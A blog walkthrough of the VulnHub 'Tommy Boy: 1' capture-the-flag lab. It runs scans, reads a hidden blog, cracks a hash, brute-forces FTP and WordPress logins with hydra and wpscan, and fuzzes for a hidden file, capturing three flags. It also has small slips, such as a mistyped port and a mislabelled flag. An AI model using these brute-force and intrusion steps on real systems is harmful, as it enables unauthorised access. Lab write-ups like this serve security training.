
<!DOCTYPE HTML>
<html>
<head>
	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
	<meta charset="utf-8">
	<title>[VulnHub] Tommy Boy: 1  | F4l13n5n0w</title>

<meta name="author" content="F4l13n5n0w"> 

<meta name="description" content="This is a description"> <meta name="keywords" content="">

	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>

<script language="Javascript" type="text/javascript">
$(document).ready(
  function() {
    (function($) {
      $(".fancybox[data-content-id]").each(function() {
        this.href = $(this).data('content-id');
      });
      $(".fancybox").fancybox({
        beforeLoad: function() {
          var el, 
              id = $(this.element).data('title-id');

          if (id) {
            el = $('#' + id);

            if (el.length) {
              this.title = el.html();
            }
          }
          if ($(this).data('content')) {
            this.content = $(this).data('content');
          }
        },
        helpers: {
          title: {
            type: 'inside'
          }
        }
      });
    })(jQuery);
  }
);
</script>

	<link href='https://fonts.googleapis.com/css?family=Delius' rel='stylesheet' type='text/css'>
</head>



<body>
	<header id="header" class="inner"><h1><a href="/">F4l13n5n0w</a></h1>
<h4>Info Security & Pen Testing learning notes</h4>
<nav id="main-nav"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:f4l13n5n0w.github.io">
			</form>
		</div>
	</div>
</nav>


</header>

	<div id="content" class="inner"><article class="post">
	<h2 class="title">[VulnHub] Tommy Boy: 1</h2>
	<div class="entry-content"><p>&ldquo;HOLY SCHNIKES! Tommy Boy needs your help!</p>

<p>The Callahan Auto company has finally entered the world of modern technology and stood up a Web server for their customers to use for ordering brake pads.</p>

<p>Unfortunately, the site just went down and the only person with admin credentials is Tom Callahan Sr. - who just passed away! And to make matters worse, the only other guy with knowledge of the server just quit!</p>

<p>You&rsquo;ll need to help Tom Jr., Richard and Michelle get the Web page restored again. Otherwise Callahan Auto will most certainly go out of business :-(&ldquo; &ndash; <a href="https://www.vulnhub.com/author/brian-johnson,256/">Brian Johnson</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: Tommy Boy 1.0 (<em>10.1.1.141/24</em>)</p>

<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.141    00:0c:29:8f:0f:b7   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:f1:c0:1f   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.363 seconds <span class="o">(</span>108.34 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.141</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# masscan -p1-65535 10.1.1.141/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-09-04 11:29:55 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 8008/tcp on 10.1.1.141
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.141
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.141
</span><span class='line'>Discovered open port 65534/tcp on 10.1.1.141
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.141
</span><span class='line'>Host is up <span class="o">(</span>0.00035s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: POST OPTIONS GET HEAD
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">4</span> disallowed entries
</span><span class='line'><span class="p">|</span> /6packsofb...soda /lukeiamyourfather
</span><span class='line'><span class="p">|</span>_/lookalivelowbridge /flag-numero-uno.txt
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: Welcome to Callahan Auto
</span><span class='line'>8008/tcp  open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: POST OPTIONS GET HEAD
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: KEEP OUT
</span><span class='line'>65534/tcp open  ftp     ProFTPD
</span><span class='line'>MAC Address: 00:0C:29:8F:0F:B7 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Based on the result of NMAP scan, firstly, I found OpenSSH 7.2p2 running on port 22, Apache httpd 2.4.18 running on port 80 and 8008 and ProFTPd running on port 65534.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>

<p>Nothing found on port 8008, however, there are some interesting findings from nikto scan on port 80:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>+ Entry <span class="s1">&#39;/6packsofb...soda&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>301<span class="o">)</span>
</span><span class='line'>+ OSVDB-3268: /lukeiamyourfather/: Directory indexing found.
</span><span class='line'>+ Entry <span class="s1">&#39;/lukeiamyourfather/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ OSVDB-3268: /lookalivelowbridge/: Directory indexing found.
</span><span class='line'>+ Entry <span class="s1">&#39;/lookalivelowbridge/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ Entry <span class="s1">&#39;/flag-numero-uno.txt&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ <span class="s2">&quot;robots.txt&quot;</span> contains <span class="m">4</span> entries which should be manually viewed.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span></code></pre></td></tr></table></div></figure>


<p>I noticed that the robot file <code>robots.txt</code> is found and including 4 entries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>User-agent: *
</span><span class='line'>Disallow: /6packsofb...soda
</span><span class='line'>Disallow: /lukeiamyourfather
</span><span class='line'>Disallow: /lookalivelowbridge
</span><span class='line'>Disallow: /flag-numero-uno.txt
</span></code></pre></td></tr></table></div></figure>


<h3>The 1st Flag</h3>

<p><img class="left" src="/downloads/tommyboy1/1.png"></p>

<p>The 1st Flag is <font color="red"><code>B34rcl4ws</code></font></p>

<p>Also checked other folders but nothing found, so I decited to move on.</p>

<p>Then, by checking the source code of index page on port 80, hidden comments are found:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;title&gt;</span>Welcome to Callahan Auto<span class="nt">&lt;/title&gt;</span>
</span><span class='line'><span class="nt">&lt;body&gt;</span>
</span><span class='line'><span class="nt">&lt;H1&gt;&lt;center&gt;</span>Welcome to Callahan Auto!<span class="nt">&lt;/center&gt;&lt;/H1&gt;</span>
</span><span class='line'><span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">&quot;FF3339&quot;</span><span class="nt">&gt;&lt;H2&gt;</span>SYSTEM ERROR!<span class="nt">&lt;/H2&gt;&lt;/font&gt;</span>
</span><span class='line'>If your&#39;e reading this, the Callahan Auto customer ordering system is down.  Please restore the backup copy immediately.
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span><span class='line'>See Nick in IT for assistance.
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: backup copy is in Big Tom&#39;s home folder--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: can you give me access too? Big Tom&#39;s the only one w/password--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: Yeah yeah, my processor can only handle one command at a time--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: please, I&#39;ll ask nicely--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: I will set you up with admin access *if* you tell Tom to stop storing important information in the company blog--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: Deal.  Where&#39;s the blog again?--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It&#39;s here if you don&#39;t remember: https://www.youtube.com/watch?v=VUxOd4CszJ8--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: Ah! How could I forget?  Thanks--&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>From the comment, I got a YouTube hint: <font color="red"><code>https://www.youtube.com/watch?v=VUxOd4CszJ8</code></font>, after checked the youtube, I got the hidden blog path is <font color="red"><code>http://10.1.1.141/prehistoricforest</code></font>.</p>

<p>From the YouTube video, I got the key to access to the hidden blog (<font color="red"><em>Hint:</em></font> <strong>if met Database Error, restart the target VM should fix the problem</strong>) and found the 2nd flag clue under the post <code>Announcing the Callahan internal company blog!</code>, the URL is <code>http://10.1.1.141/prehistoricforest/index.php/2016/07/06/announcing-the-callahan-internal-company-blog/</code></p>

<p><img class="left" src="/downloads/tommyboy1/2.png"></p>

<h3>The 2nd Flag</h3>

<p><img class="left" src="/downloads/tommyboy1/3.png"></p>

<p>The 2nd Flag is <font color="red"><code>Z4l1nsky</code></font></p>

<p>Another hint from the post <code>SON OF A!</code>:</p>

<p><img class="left" src="/downloads/tommyboy1/4.png"></p>

<p>There is another Image File under the folder <code>http://10.1.1.141/richard/shockedrichard.jpg</code></p>

<p>By checking the imga file with tool <code>exif</code>, I noticed that there is a MD5 hash in User Comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# exif shockedrichard.jpg
</span><span class='line'>EXIF tags in <span class="s1">&#39;shockedrichard.jpg&#39;</span> <span class="o">(</span><span class="s1">&#39;Intel&#39;</span> byte order<span class="o">)</span>:
</span><span class='line'>--------------------+----------------------------------------------------------
</span><span class='line'>Tag                 <span class="p">|</span>Value
</span><span class='line'>--------------------+----------------------------------------------------------
</span><span class='line'>Software            <span class="p">|</span>Google
</span><span class='line'>Copyright           <span class="p">|</span>Copyright © <span class="m">1995</span> Paramount Pictures Corporation. Credit: ©
</span><span class='line'>X-Resolution        <span class="p">|</span>72
</span><span class='line'>Y-Resolution        <span class="p">|</span>72
</span><span class='line'>Resolution Unit     <span class="p">|</span>Inch
</span><span class='line'>Exif Version        <span class="p">|</span>Exif Version 2.2
</span><span class='line'>User Comment        <span class="p">|</span>ce154b5a8e59c89732bc25d6a2e6b90b
</span><span class='line'>Pixel X Dimension   <span class="p">|</span>1600
</span><span class='line'>Pixel Y Dimension   <span class="p">|</span>1029
</span><span class='line'>FlashPixVersion     <span class="p">|</span>FlashPix Version 1.0
</span><span class='line'>Color Space         <span class="p">|</span>Internal error <span class="o">(</span>unknown value 65535<span class="o">)</span>
</span><span class='line'>--------------------+----------------------------------------------------------
</span></code></pre></td></tr></table></div></figure>


<p>By cracking the hash online and got the cracked password is <font color="red"><code>spanky</code></font>></p>

<p>In the other post <code>Protected: Status of restoring company home page</code>, I found a password is needed.</p>

<p><img class="left" src="/downloads/tommyboy1/5.png"></p>

<p>Then I input <font color="red"><code>spanky</code></font> as the password and got into the protected blog.</p>

<p>Some important information from the blog:</p>

<ul>
<li><p>In order to restore, there is a backup file called <code>callahanbak.bak</code> that we can rename it to <code>index.html</code>. (We have to do this under Big Tom&rsquo;s account via SSH)</p></li>
<li><p>Big Tom&rsquo;s account name should be able to find in the user list and may not be called as bigtom but easy to recognize.</p></li>
<li><p>There is a FTP service running on non-standard port (65543, which is found by NMAP in the previous step) and can be accessed by nick&rsquo;s account.</p></li>
<li><p>Nick&rsquo;s account name is <code>nickburns</code> and the password is very easy to guess.</p></li>
<li><p>Nick is not able to access SSH but only FTP.</p></li>
</ul>


<p>Based on the information above, I use <code>hydra</code> to do a quick brute force scanning:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# hydra -e nsr -l nickburns ftp://10.1.1.141:65534/
</span><span class='line'>Hydra v8.2 <span class="o">(</span>c<span class="o">)</span> <span class="m">2016</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2016-09-04 22:36:19
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">3</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">3</span> login tries <span class="o">(</span>l:1/p:3<span class="o">)</span>, ~0 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 65534
</span><span class='line'><span class="o">[</span>65534<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.141   login: nickburns   password: nickburns
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2016-09-04 22:36:20
</span></code></pre></td></tr></table></div></figure>


<p>and found Nick&rsquo;s FTP login credencial is <font color="red"><code>nickburns / nickburns</code></font></p>

<p>Now I login to FTP as Nick and downloaded the only file <code>readme.txt</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# ftp 10.1.1.141 65534
</span><span class='line'>Connected to 10.1.1.141.
</span><span class='line'><span class="m">220</span> Callahan_FTP_Server 1.3.5
</span><span class='line'>Name <span class="o">(</span>10.1.1.141:root<span class="o">)</span>: nickburns
</span><span class='line'><span class="m">331</span> Password required <span class="k">for</span> nickburns
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> User nickburns logged in
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; list
</span><span class='line'>?Invalid <span class="nb">command</span>
</span><span class='line'>ftp&gt; dir
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful
</span><span class='line'><span class="m">150</span> Opening ASCII mode data connection <span class="k">for</span> file list
</span><span class='line'>-rw-rw-r--   <span class="m">1</span> nickburns nickburns      <span class="m">977</span> Jul <span class="m">15</span> 02:37 readme.txt
</span><span class='line'><span class="m">226</span> Transfer <span class="nb">complete</span>
</span><span class='line'>ftp&gt; get readme.txt
</span><span class='line'><span class="nb">local</span>: readme.txt remote: readme.txt
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful
</span><span class='line'><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> readme.txt <span class="o">(</span><span class="m">977</span> bytes<span class="o">)</span>
</span><span class='line'><span class="m">226</span> Transfer <span class="nb">complete</span>
</span><span class='line'><span class="m">977</span> bytes received in 0.02 secs <span class="o">(</span>40.6745 kB/s<span class="o">)</span>
</span><span class='line'>ftp&gt; bye
</span><span class='line'><span class="m">221</span> Goodbye.
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Due to this is WordPress application, I use <code>wpscan</code> to check if any vulnerability exists and enumerate users:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Identified the following <span class="m">4</span> user/s:
</span><span class='line'>    +----+----------+-------------------+
</span><span class='line'>    <span class="p">|</span> Id <span class="p">|</span> Login    <span class="p">|</span> Name              <span class="p">|</span>
</span><span class='line'>    +----+----------+-------------------+
</span><span class='line'>    <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> richard  <span class="p">|</span> richard           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> tom      <span class="p">|</span> Big Tom           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> tommy    <span class="p">|</span> Tom Jr.           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> michelle <span class="p">|</span> Michelle Michelle <span class="p">|</span>
</span><span class='line'>    +----+----------+-------------------+
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Four WP users found:
<font color="red"></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>richard
</span><span class='line'>tom
</span><span class='line'>tommy
</span><span class='line'>michelle
</span></code></pre></td></tr></table></div></figure>


<p></font></p>

<p>Then use dictionary file <code>rockyou.txt</code> to brute force crack those users, and got tom&rsquo;s password cracked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>  +----+----------+-------------------+----------+
</span><span class='line'>  <span class="p">|</span> Id <span class="p">|</span> Login    <span class="p">|</span> Name              <span class="p">|</span> Password <span class="p">|</span>
</span><span class='line'>  +----+----------+-------------------+----------+
</span><span class='line'>  <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> richard  <span class="p">|</span> richard           <span class="p">|</span>          <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> tom      <span class="p">|</span> Big Tom           <span class="p">|</span> tomtom1  <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> tommy    <span class="p">|</span> Tom Jr.           <span class="p">|</span>          <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> michelle <span class="p">|</span> Michelle Michelle <span class="p">|</span>          <span class="p">|</span>
</span><span class='line'>  +----+----------+-------------------+----------+
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="/downloads/tommyboy1/6.png"></p>

<p>After change <code>User-Agent to</code> <code>Iphone 3</code>, I got the different content!</p>

<p><img class="left" src="/downloads/tommyboy1/7.png"></p>

<p>Use <code>wfuzz</code> with <code>rockyou.txt</code> to find out the hidden html file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -v -w /usr/share/wordlists/rockyou.txt -H <span class="s2">&quot;User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16&quot;</span> --hc <span class="m">404</span> http://10.1.1.141:8008/NickIzL33t/FUZZ.html
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz 2.1.3 - The Web Bruteforcer                      *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://10.1.1.141:8008/NickIzL33t/FUZZ.html
</span><span class='line'>Total requests: <span class="nv">14344392</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="o">==============================================================================================================================================</span>
</span><span class='line'>ID    C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   <span class="nv">Request</span>
</span><span class='line'><span class="o">==============================================================================================================================================</span>
</span><span class='line'>
</span><span class='line'>97206:  0.040s   <span class="nv">C</span><span class="o">=</span><span class="m">200</span>     <span class="m">12</span> L        <span class="m">65</span> W       <span class="m">459</span> Ch     Apache/2.4.18 <span class="o">(</span>Ub                                                        <span class="s2">&quot;fallon1&quot;</span>
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="/downloads/tommyboy1/8.png"></p>

<h3>The 3rd Flag</h3>

<p><img class="left" src="/downloads/tommyboy1/9.png"></p>

<p>The 2nd Flag is <font color="red"><code>TinyHead</code></font></p>

